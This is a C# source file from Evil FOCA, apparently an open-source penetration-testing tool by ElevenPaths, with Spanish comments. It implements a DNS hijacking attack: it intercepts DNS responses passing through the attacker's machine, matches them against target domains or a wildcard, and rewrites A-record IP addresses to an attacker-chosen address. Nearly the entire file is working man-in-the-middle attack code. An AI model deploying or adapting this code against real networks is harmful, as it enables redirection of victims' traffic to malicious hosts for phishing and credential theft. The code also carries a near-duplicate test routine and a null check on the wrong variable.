/* 
Evil FOCA
Copyright (C) 2015 ElevenPaths

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using SharpPcap.WinPcap;
using PacketDotNet;
using System.IO;
using System.Net;
using SharpPcap.LibPcap;
using System.Net.NetworkInformation;
using evilfoca.Data;

namespace evilfoca.Attacks
{
    class DNSHijacking
    {
        SynchronizedCollection<Data.Attack> attacks;
        private WinPcapDevice Device;

        public DNSHijacking(WinPcapDevice dev, SynchronizedCollection<Data.Attack> attacks)
        {
            this.Device = dev;
            this.attacks = attacks;
        }

        private bool NeedToRoute(IpPacket pIp)
        {
            bool needToRoute = true;
            foreach (PcapAddress remoteAddress in Device.Addresses)
            {
                if (remoteAddress.Addr.ipAddress == null)
                    continue;

                if (remoteAddress.Addr.ipAddress.Equals(pIp.DestinationAddress))
                    needToRoute = false; // Va dirigido a nuestra IP, así que no se enruta
            }

            return needToRoute;
        }

        public bool CheckIfHijack(Packet p)
        {

            foreach (Data.Attack attack in attacks.Where(A => A.attackType == Data.AttackType.DNSHijacking && A.attackStatus == Data.AttackStatus.Attacking))
            {
                if ((p.PayloadPacket != null && p.PayloadPacket.PayloadPacket != null) && (p.PayloadPacket.PayloadPacket is UdpPacket))
                {
                    EthernetPacket ethernet = (EthernetPacket)p;
                    IpPacket ip = (IpPacket)p.PayloadPacket;
                    UdpPacket udp = (UdpPacket)p.PayloadPacket.PayloadPacket;

                    if ((udp.SourcePort == 53)) // La respuesta DNS
                    {
                        // Comprobamos que venga a nuestra MAC pero no a nuestra IP
                        if (NeedToRoute(ip))
                        {
                            try
                            {
                                Heijden.DNS.Response response = new Heijden.DNS.Response(new IPEndPoint(IPAddress.Parse("1.2.3.4"), 53), udp.PayloadData);
                                DNSHijackAttack dnsAttack = (DNSHijackAttack)attack;

                                foreach (Heijden.DNS.Question q in response.Questions)
                                {
                                    if ((q.QName == dnsAttack.domain + ".") || dnsAttack.domain == "*")
                                        return true;
                                }
                            }
                            catch
                            {
                                return false;
                            }
                        }
                        else
                            return false;
                    }
                }
            }
            return false;
        }

        public IPAddress GetIpFromSpoofDomain(string domain)
        {
            foreach (Attack attack in attacks)
            {
                if (attack is DNSHijackAttack)
                {
                    if (((DNSHijackAttack)attack).domain == "*" || ((DNSHijackAttack)attack).domain.ToLower() == domain.ToLower())
                    {
                        return ((DNSHijackAttack)attack).ip;
                    }
                }
            }

            return null;
        }

        public Attack GetAttackFromSpoofDomain(string domain)
        {
            foreach (Attack attack in attacks)
            {
                if (attack is DNSHijackAttack)
                {
                    if (((DNSHijackAttack)attack).domain == "*" || ((DNSHijackAttack)attack).domain.ToLower() == domain.ToLower())
                    {
                        return attack;
                    }
                }
            }

            return null;
        }

        public Packet Hijack(Packet p)
        {
            if (!CheckIfHijack(p))
                return null;

            EthernetPacket ethernet = (EthernetPacket)p;
            IpPacket ip = (IpPacket)p.PayloadPacket;
            UdpPacket udp = (UdpPacket)p.PayloadPacket.PayloadPacket;

            MemoryStream ms = new MemoryStream(udp.PayloadData);
            BinaryReader br = new BinaryReader(ms);

            StringBuilder sbName = new StringBuilder();

            string x = ASCIIEncoding.ASCII.GetString(udp.PayloadData);

            // trans id
            short id = br.ReadInt16();
            // flags
            br.ReadInt16();
            // questions
            short questions = IPAddress.NetworkToHostOrder(br.ReadInt16());
            // answers
            short answers = IPAddress.NetworkToHostOrder(br.ReadInt16());
            // authority rrs
            short authorityRRs = IPAddress.NetworkToHostOrder(br.ReadInt16());
            // aditional rrs
            short aditionalRRs = IPAddress.NetworkToHostOrder(br.ReadInt16());

            for (int i = 0; i < questions; i++)
            {
                sbName = new StringBuilder();

                // En este while lee el nombre del dominio al que se le hace la peticion
                while (true)
                {
                    byte b = br.ReadByte();

                    if (b == 0x00)
                        break;

                    if ((b > 0 && b < Convert.ToByte('0')))
                    {
                        if (sbName.Length > 0)
                            sbName.Append(".");
                    }
                    else
                        sbName.Append((char)b);
                }

                // type
                br.ReadInt16();
                // class
                br.ReadInt16();
            }

            for (int i = 0; i < answers; i++)
            {
                // name ¿puntero?
                br.ReadInt16();
                // type
                short type = IPAddress.NetworkToHostOrder(br.ReadInt16());
                // class
                br.ReadInt16();
                // ttl
                br.ReadInt32();
                // length
                short lenAnswer = IPAddress.NetworkToHostOrder(br.ReadInt16());

                if (type == 0x01) // 0x01 -> 'A'
                {
                    if (lenAnswer == 4) // ipv4. Si es tipo 0x01 ('A') la IP siempre debería tener un tamaño de 4 bytes.
                    {

                        byte[] raw = new byte[p.PayloadPacket.PayloadPacket.PayloadData.Length];
                        for (int b = 0; b < p.PayloadPacket.PayloadPacket.PayloadData.Length; b++)
                            raw[b] = p.PayloadPacket.PayloadPacket.PayloadData[b];

                        IPAddress ipSpoof = GetIpFromSpoofDomain(sbName.ToString());
                        if (ip != null)
                        {
                            if (ipSpoof.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                            {
                                raw[ms.Position + 0] = ipSpoof.GetAddressBytes()[0];
                                raw[ms.Position + 1] = ipSpoof.GetAddressBytes()[1];
                                raw[ms.Position + 2] = ipSpoof.GetAddressBytes()[2];
                                raw[ms.Position + 3] = ipSpoof.GetAddressBytes()[3];
                                // Avanzamos el stream con los 4 bytes que hemos modificado
                                for (int fool = 0; fool < lenAnswer; fool++)
                                    br.ReadByte();
                            }
                        }

                        p.PayloadPacket.PayloadPacket.PayloadData = raw;
                    }
                }
                else
                {
                    for (int fool = 0; fool < lenAnswer; fool++)
                        br.ReadByte();
                }
            }
            Attack thisAttack = GetAttackFromSpoofDomain(sbName.ToString());
            if (thisAttack != null)
            {
                // Esto siempre deberia pasar, pero por si acaso hacemos la comprobacón del NULL
                if (thisAttack is DNSHijackAttack)
                {
                    ((DNSHijackAttack)thisAttack).spoofsAttacks++;
                    Program.LogThis("Domain " + sbName.ToString() + " spoofed to " + ip.DestinationAddress.ToString(), Logs.Log.LogType.DNSHijacking);
                }
            }
            return p;
        }

        public Packet HijackTest(Packet p)
        {

            EthernetPacket ethernet = (EthernetPacket)p;
            IpPacket ip = (IpPacket)p.PayloadPacket;
            UdpPacket udp = (UdpPacket)p.PayloadPacket.PayloadPacket;

            MemoryStream ms = new MemoryStream(udp.PayloadData);
            BinaryReader br = new BinaryReader(ms);

            StringBuilder sbName = new StringBuilder();

            string x = ASCIIEncoding.ASCII.GetString(udp.PayloadData);

            // trans id
            short id = br.ReadInt16();
            // flags
            br.ReadInt16();
            // questions
            short questions = IPAddress.NetworkToHostOrder(br.ReadInt16());
            // answers
            short answers = IPAddress.NetworkToHostOrder(br.ReadInt16());
            // authority rrs
            short authorityRRs = IPAddress.NetworkToHostOrder(br.ReadInt16());
            // aditional rrs
            short aditionalRRs = IPAddress.NetworkToHostOrder(br.ReadInt16());

            for (int i = 0; i < questions; i++)
            {
                sbName = new StringBuilder();

                // En este while lee el nombre del dominio al que se le hace la peticion
                while (true)
                {
                    byte b = br.ReadByte();

                    if (b == 0x00)
                        break;

                    if ((b > 0 && b < Convert.ToByte('0')))
                    {
                        if (sbName.Length > 0)
                            sbName.Append(".");
                    }
                    else
                        sbName.Append((char)b);
                }

                // type
                br.ReadInt16();
                // class
                br.ReadInt16();
            }

            for (int i = 0; i < answers; i++)
            {
                // name ¿puntero?
                br.ReadInt16();
                // type
                short type = IPAddress.NetworkToHostOrder(br.ReadInt16());
                // class
                br.ReadInt16();
                // ttl
                br.ReadInt32();
                // length
                short lenAnswer = IPAddress.NetworkToHostOrder(br.ReadInt16());

                if (type == 0x01) // 0x01 -> 'A'
                {
                    if (lenAnswer == 4) // ipv4. Si es tipo 0x01 ('A') la IP siempre debería tener un tamaño de 4 bytes.
                    {

                        byte[] raw = new byte[p.PayloadPacket.PayloadPacket.PayloadData.Length];
                        for (int b = 0; b < p.PayloadPacket.PayloadPacket.PayloadData.Length; b++)
                            raw[b] = p.PayloadPacket.PayloadPacket.PayloadData[b];

                        IPAddress ipSpoof = GetIpFromSpoofDomain(sbName.ToString());
                        if (ip != null)
                        {
                            if (ipSpoof.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                            {
                                raw[ms.Position + 0] = ipSpoof.GetAddressBytes()[0];
                                raw[ms.Position + 1] = ipSpoof.GetAddressBytes()[1];
                                raw[ms.Position + 2] = ipSpoof.GetAddressBytes()[2];
                                raw[ms.Position + 3] = ipSpoof.GetAddressBytes()[3];
                                // Avanzamos el stream con los 4 bytes que hemos modificado
                                for (int fool = 0; fool < lenAnswer; fool++)
                                    br.ReadByte();
                            }
                        }

                        p.PayloadPacket.PayloadPacket.PayloadData = raw;
                    }
                }
                else
                {
                    for (int fool = 0; fool < lenAnswer; fool++)
                        br.ReadByte();
                }
            }
            Attack thisAttack = GetAttackFromSpoofDomain(sbName.ToString());
            if (thisAttack != null)
            {
                // Esto siempre deberia pasar, pero por si acaso hacemos la comprobacón del NULL
                if (thisAttack is DNSHijackAttack)
                {
                    ((DNSHijackAttack)thisAttack).spoofsAttacks++;
                    Program.LogThis("Domain " + sbName.ToString() + " spoofed to " + ip.DestinationAddress.ToString(), Logs.Log.LogType.DNSHijacking);
                }
            }
            return p;
        }


    }
}
